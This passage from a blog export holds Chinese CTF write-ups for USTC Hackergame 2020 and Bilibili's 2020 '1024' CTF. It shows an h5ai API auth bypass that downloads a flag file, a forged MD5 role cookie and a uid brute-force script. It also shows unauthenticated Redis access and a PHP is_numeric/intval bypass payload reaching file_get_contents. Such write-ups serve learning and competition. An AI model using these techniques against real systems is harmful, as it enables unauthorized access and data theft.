<code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get 